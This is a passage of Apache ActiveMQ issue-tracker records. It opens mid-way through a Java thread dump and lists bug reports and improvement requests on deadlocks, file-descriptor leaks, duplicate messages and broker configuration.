(Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@249: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@248: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@247: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer, javax.jms.MessageProducer) @bci=69, line=203 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@246: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@245: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@244: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@243: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - org.apache.activemq.MessageDispatchChannel.dequeue(long) @bci=60, line=77 (Compiled frame) - org.apache.activemq.ActiveMQMessageConsumer.receive(long) @bci=53, line=546 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session, javax.jms.MessageConsumer) @bci=21, line=184 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Session) @bci=23, line=170 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages(javax.jms.Connection) @bci=35, line=157 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.processMessages() @bci=71, line=141 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Consumer.run() @bci=13, line=222 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@242: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.util.TimerThread.mainLoop() @bci=201, line=509 (Compiled frame) - java.util.TimerThread.run() @bci=1, line=462 (Interpreted frame)Thread t@241: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.util.TimerThread.mainLoop() @bci=201, line=509 (Compiled frame) - java.util.TimerThread.run() @bci=1, line=462 (Interpreted frame)Thread t@239: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@237: (state = IN_NATIVE) - java.net.SocketInputStream.socketRead0(java.io.FileDescriptor, byte[], int, int, int) @bci=0 (Compiled frame; information may be imprecise) - java.net.SocketInputStream.read(byte[], int, int) @bci=84, line=129 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill() @bci=31, line=50 (Compiled frame) - org.apache.activemq.transport.tcp.TcpBufferedInputStream.read() @bci=12, line=58 (Compiled frame) - org.apache.activemq.openwire.OpenWireFormat.unmarshal(java.io.DataInput) @bci=10, line=272 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransport.readCommand() @bci=8, line=210 (Compiled frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@233: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.lang.Object.wait() @bci=2, line=474 (Compiled frame) - org.apache.activemq.kaha.impl.async.DataFileAppender$2.run() @bci=4, line=227 (Interpreted frame)Thread t@230: (state = IN_NATIVE) - java.net.PlainSocketImpl.socketAccept(java.net.SocketImpl) @bci=0 (Interpreted frame) - java.net.PlainSocketImpl.socketAccept(java.net.SocketImpl) @bci=0 (Interpreted frame) - java.net.PlainSocketImpl.accept(java.net.SocketImpl) @bci=7, line=384 (Interpreted frame) - java.net.ServerSocket.implAccept(java.net.Socket) @bci=50, line=450 (Interpreted frame) - java.net.ServerSocket.accept() @bci=48, line=421 (Interpreted frame) - org.apache.activemq.transport.tcp.TcpTransportServer.run() @bci=13, line=280 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@229: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.parkNanos(long) @bci=11, line=146 (Compiled frame) - org.apache.activemq.transport.tcp.TcpTransportServer$1.run() @bci=31, line=352 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@227: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove(long) @bci=44, line=116 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove() @bci=2, line=132 (Interpreted frame) - sun.rmi.transport.ObjectTable$Reaper.run() @bci=3, line=336 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@225: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.lang.Object.wait() @bci=2, line=474 (Compiled frame) - org.apache.activemq.kaha.impl.async.DataFileAppender$2.run() @bci=4, line=227 (Interpreted frame)Thread t@44: (state = BLOCKED) - java.lang.Thread.sleep(long) @bci=0 (Interpreted frame) - java.lang.Thread.sleep(long) @bci=0 (Interpreted frame) - sun.rmi.transport.DGCImpl$LeaseChecker.run() @bci=3, line=310 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@39: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove(long) @bci=44, line=116 (Interpreted frame) - sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run() @bci=95, line=501 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@32: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - sun.misc.GC$Daemon.run() @bci=51, line=100 (Interpreted frame)Thread t@30: (state = IN_NATIVE) - java.net.PlainSocketImpl.socketAccept(java.net.SocketImpl) @bci=0 (Interpreted frame) - java.net.PlainSocketImpl.socketAccept(java.net.SocketImpl) @bci=0 (Interpreted frame) - java.net.PlainSocketImpl.accept(java.net.SocketImpl) @bci=7, line=384 (Interpreted frame) - java.net.ServerSocket.implAccept(java.net.Socket) @bci=50, line=450 (Interpreted frame) - java.net.ServerSocket.accept() @bci=48, line=421 (Interpreted frame) - sun.rmi.transport.tcp.TCPTransport.run() @bci=59, line=340 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@27: (state = IN_NATIVE)Error occurred during stack walking:Thread t@26: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - java.util.TimerThread.mainLoop() @bci=28, line=483 (Interpreted frame) - java.util.TimerThread.run() @bci=1, line=462 (Interpreted frame)Thread t@21: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.util.TimerThread.mainLoop() @bci=201, line=509 (Compiled frame) - java.util.TimerThread.run() @bci=1, line=462 (Interpreted frame)Thread t@15: (state = BLOCKED)Thread t@14: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove(long) @bci=44, line=116 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove() @bci=2, line=132 (Interpreted frame) - java.lang.ref.Finalizer$FinalizerThread.run() @bci=3, line=159 (Interpreted frame)Thread t@13: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Compiled frame; information may be imprecise) - java.lang.Object.wait() @bci=2, line=474 (Compiled frame) - java.lang.ref.Reference$ReferenceHandler.run() @bci=46, line=116 (Interpreted frame)Thread t@1: (state = BLOCKED) - sun.misc.Unsafe.park(boolean, long) @bci=0 (Compiled frame; information may be imprecise) - java.util.concurrent.locks.LockSupport.park() @bci=5, line=118 (Compiled frame) - java.util.concurrent.ArrayBlockingQueue.take() @bci=20, line=341 (Compiled frame) - org.apache.activemq.transport.FutureResponse.getResult() @bci=4, line=40 (Compiled frame) - org.apache.activemq.ActiveMQConnection.syncSendPacket(org.apache.activemq.command.Command) @bci=20, line=1244 (Compiled frame) - org.apache.activemq.TransactionContext.commit() @bci=124, line=282 (Compiled frame) - org.apache.activemq.ActiveMQSession.commit() @bci=76, line=510 (Compiled frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.sendMessages(javax.jms.Session, javax.jms.Destination, javax.jms.MessageConsumer) @bci=41, line=372 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.sendMessages(javax.jms.Session, javax.jms.Destination) @bci=14, line=313 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.sendMessages(javax.jms.Session) @bci=12, line=300 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.sendMessages(org.apache.activemq.ActiveMQConnection) @bci=11, line=280 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.sendMessages() @bci=24, line=262 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test$Producer.execute(java.lang.String[]) @bci=1, line=248 (Interpreted frame) - org.apache.activemq.bugs.AMQ2102Test.testMasterSlaveBug() @bci=70, line=487 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) @bci=0 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=87, line=39 (Interpreted frame) - sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=6, line=25 (Interpreted frame) - java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object[]) @bci=111, line=585 (Interpreted frame) - junit.framework.TestCase.runTest() @bci=107, line=168 (Interpreted frame) - junit.framework.TestCase.runBare() @bci=7, line=134 (Interpreted frame) - org.apache.activemq.CombinationTestSupport.runBare() @bci=8, line=90 (Interpreted frame) - org.apache.activemq.CombinationTestSupport.runBare() @bci=53, line=96 (Interpreted frame) - junit.framework.TestResult$1.protect() @bci=4, line=110 (Interpreted frame) - junit.framework.TestResult.runProtected(junit.framework.Test, junit.framework.Protectable) @bci=1, line=128 (Interpreted frame) - junit.framework.TestResult.run(junit.framework.TestCase) @bci=18, line=113 (Interpreted frame) - junit.framework.TestCase.run(junit.framework.TestResult) @bci=2, line=124 (Interpreted frame) - junit.framework.TestSuite.runTest(junit.framework.Test, junit.framework.TestResult) @bci=2, line=232 (Interpreted frame) - junit.framework.TestSuite.run(junit.framework.TestResult) @bci=40, line=227 (Interpreted frame) - org.junit.internal.runners.JUnit38ClassRunner.run(org.junit.runner.notification.RunNotifier) @bci=21, line=81 (Interpreted frame) - org.apache.maven.surefire.junit4.JUnit4TestSet.execute(org.apache.maven.surefire.report.ReporterManager, java.lang.ClassLoader) @bci=30, line=62 (Interpreted frame) - org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(org.apache.maven.surefire.testset.SurefireTestSet, org.apache.maven.surefire.report.ReporterManager, java.lang.ClassLoader) @bci=43, line=140 (Interpreted frame) - org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(java.lang.String, org.apache.maven.surefire.report.ReporterManager, java.lang.ClassLoader) @bci=74, line=165 (Interpreted frame) - org.apache.maven.surefire.Surefire.run(java.util.List, java.lang.Object[], java.lang.String, java.lang.ClassLoader, java.lang.ClassLoader, java.util.Properties, java.lang.Boolean) @bci=92, line=107 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) @bci=0 (Interpreted frame) - sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=87, line=39 (Interpreted frame) - sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) @bci=6, line=25 (Interpreted frame) - java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object[]) @bci=111, line=585 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(java.lang.String, java.util.Properties) @bci=361, line=289 (Interpreted frame) - org.apache.maven.surefire.booter.SurefireBooter.main(java.lang.String[]) @bci=717, line=1005 (Interpreted frame)
issueID:AMQ-2352
type:Improvement
changed files:SystemPropertiesConfiguration.java
texts:it should be possible to specify userName and password in the webconsole-properties.xml
file to adapt srcactivemq-web-consolesrcmainwebappWEB-INFwebconsole-properties.xml<bean id="connectionFactory" class="org.apache.activemq.ActiveMQConnectionFactory"><property name="brokerURL" value="${webconsole.jms.url}"/><property name="userName" value="${webconsole.jms.userName}"/><property name="password" value="${webconsole.jms.password}"/>  </bean>
issueID:AMQ-2354
type:Improvement
changed files:ActiveMQResourceAdapter.java
texts:Default the ServerUrl to vm://brokerName?create=false when an embedded broker is specified with brokerXmlConfig
By default, a hardcoded ServerUrl resource configuration property must be specified in the ra.xml to connect to a broker. However, when using an embedded broker initialized from the BrokerXmlConfig configuration property, the ServerUrl should be defaulted to vm://brokerName (where brokerName is obtained via Broker.getBrokerName()). This would enable more flexibility in configuring the embedded broker name (e.g. using spring property substitution to name) as opposed to hardcoding as vm://localhost or some other uri in the ra.xml.I"ve created a patch against trunk to ActiveMQResourceAdapter.java that adds this feature.
issueID:AMQ-2356
type:Bug
changed files:
texts:optimizeDispatch=true and UseDedicatedTaskRunner=false lead to deadlocked queues
We have an environment where we have a very large number of destinations. In an effort to reduce the number of threads I have set the options-Dorg.apache.activemq.UseDedicatedTaskRunner=falseand <policyEntry queue=">" optimizedDispatch="true"/>Unfortunately this very quickly leads to deadlocked queues.My environment is:ActiveMQ 5.2Ubunty Jaunty kernel 2.6.28-14-generic #47-Ubuntu SMP (although only a single core on my system)TCP transportConnectorTo reproduce the bug (which I can do 100% of the time) I connect 5 consumers (AUTO_ACK) to 5 different queues. Then I start 5 producers and pair them up with a consumer on a queue, and they start sending PERSISTENT messages. I"ve set the producer to send 100 messages and disconnect, and the consumer to receive 100 messages and disconnect. The first pair usually gets through their 100 messages and disconnect, at which point all the other pairs have deadlocked at less than 30 messages each.At this point I can connect jconsole and hit the Detect Deadlock button and it finds the 4 deadlocks for me. The 4 deadlocks all have the same stacktraces, one of which looks like this:Name: ActiveMQ Transport: tcp:///127.0.0.1:49307State: BLOCKED on java.lang.Object@f8828 owned by: ActiveMQ Transport: tcp:///127.0.0.1:48031Total blocked: 3  Total waited: 1Stack trace: org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:576)org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:150)org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1266)org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1230)org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1308)org.apache.activemq.broker.region.Queue.iterate(Queue.java:1011)org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1146)org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1141)org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:474)org.apache.activemq.broker.region.Queue.send(Queue.java:417)org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:350)org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:437)org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)...SpecialAuthorizationBroker.send(DynamicAuthorizationBroker.java:156)org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:450)org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:639)org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)java.lang.Thread.run(Thread.java:595)----------------------------------------------------------------------------------Name: ActiveMQ Transport: tcp:///127.0.0.1:48031State: BLOCKED on org.apache.activemq.broker.region.Queue$2@102d82c owned by: ActiveMQ Transport: tcp:///127.0.0.1:49307Total blocked: 3  Total waited: 0Stack trace: org.apache.activemq.broker.region.Queue.iterate(Queue.java:951)org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1146)org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1073)org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:51)org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:238)org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)java.lang.Thread.run(Thread.java:595)
issueID:AMQ-2357
type:Bug
changed files:
texts:activemq-book module fails to build
We need to upgrade to docbx plugin 2.0.9 as 2.0.3 is not available any more
issueID:AMQ-2359
type:Bug
changed files:
texts:staticallyIncludedDestinations set in a Network of Brokers results in duplicate messages
When you include statically destinations with wildcards, such as<staticallyIncludedDestinations>  <topic physicalName=">"/></staticallyIncludedDestinations>you will receive duplicate messages on the receive broker side. The problem is the reversed destination filter matching while adding an interest to the demandsubscription in the conduit bridge. It will not match that we already have a consumer for all destinations and will add another consumer for the particular destination.
issueID:AMQ-2360
type:Bug
changed files:
texts:Some destination filters don&#39;t take destination type into account
Wildcard and prefix destination filters, will match queues and topics in the same path.
issueID:AMQ-2364
type:Bug
changed files:
texts:Failover transport memory leak on rollback
See this description:http://activemq.2283324.n4.nabble.com/Failover-transport-memory-leak-on-rollback-td2365794.htmlI"m not sure but maybe the TransactionContext should call this.connection.syncSendPacket(info) instead of this.connection.asyncSendPacket(info).Cheers,Fabrice
issueID:AMQ-2366
type:Bug
changed files:LockFile.java
texts:File leak in KahaDB file lock - slave exhausts OS fd limit
If I follow the logs, the slave brokers emit this message for a while:Database /opt/fusemq/data/dev-broker1/kahadb/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.IOException: File "/opt/fusemq/data/dev-broker1/kahadb/lock" couldnot be locked.Then, it switches toDatabase /opt/fusemq/data/dev-broker1/kahadb/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.FileNotFoundException: /opt/fusemq/data/dev-broker1/kahadb/lock (Too many open files)lsof shows loads of fds allocated to the slave broker.
issueID:AMQ-2368
type:Bug
changed files:
texts:it makes no sense for activemq-admin to load SUNJMX env var from /etc/activemq.conf
it doesn"t make any sense for activemq-admin to load the SUNJMX env var from /etc/activemq.conf since if activemq-admin is run on the same system that the broker runs on in many cases the com.sun.management.jmxremote.port system property will be set in there. Since the activemq-admin script now tries to use the same port that the broker is already using the script now fails to run.You could argue that there is no point for the activemq-script to even use the SUNJMX variable at all, since there is little point in enabling a JMX connector for the script.However in the attached patch all I"ve done is to reset the SUNJMX var so that it doesn"t use what is set in /etc/activemq.conf.
issueID:AMQ-2370
type:New Feature
changed files:
texts:Upgrade to camel 2.0 GA
Now that camel 2.0 is final, need to upgrade from the milestone. org.apache.activemq.camel.CamelJmsTest has some problem with this.
issueID:AMQ-2374
type:Improvement
changed files:Topic.java
texts:Make NoSubscriptionRecoveryPolicy the default
By default, Topics use a FixedSizeSubscriptionRecoveryPolicy - which adds 64kb to every Topic. This prevents scaling Topics to large numbers using the default configuration
issueID:AMQ-2376
type:Improvement
changed files:ConnectionPool.java
texts:Restrict the lifetime of pooled connections
It might make sense to restrict the lifetime of connections in a connection pool, so that once in a while the connection is refreshed providing a chance of connection load balancing over a network of brokers.
issueID:AMQ-2378
type:Improvement
changed files:
texts:provide a Port property on the Connector MBeans so that if a broker is started using port 0 for TCP/stomp/SSL connectors, you can use JMX to query them
None
issueID:AMQ-2379
type:Improvement
changed files:
texts:make it easy to query the queue size (or topic stats) from any language by sending a message
let folks send a message (with a JMSReplyTo header) to a pseudo destinationActiveMQ.Statistics.Queues.MyQueueand get back a MapMessage with key/value pairs containing the current queue size, the enqueue/dequeue rates, number of consumers and other handy stats. Then folks could use this easily from CMS and NMS as well as via STOMP
issueID:AMQ-2381
type:Improvement
changed files:MulticastDiscoveryAgent.java
texts:Multicast discovery does not work properly on multihomed Windows 2003
Multicast discovery does not work properly on multihomed Windows 2003Packets are sent to unpredictable network interface that results in brokers loosing connection with each other.It would be nice to be able to specify network interface for multicast socket right in the discovery URI.So transport connection definition turns from         <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61617" discoveryUri="multicast://224.0.0.1"/>       </transportConnectors>to        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61617" discoveryUri="multicast://224.0.0.1?networkInterface=eth0"/>       </transportConnectors>I added support for interface/networkInterface for multicast on multihomed hosts. See attached patch
issueID:AMQ-2383
type:Bug
changed files:
texts:Simple transaction causes broker transaction has not been started exception
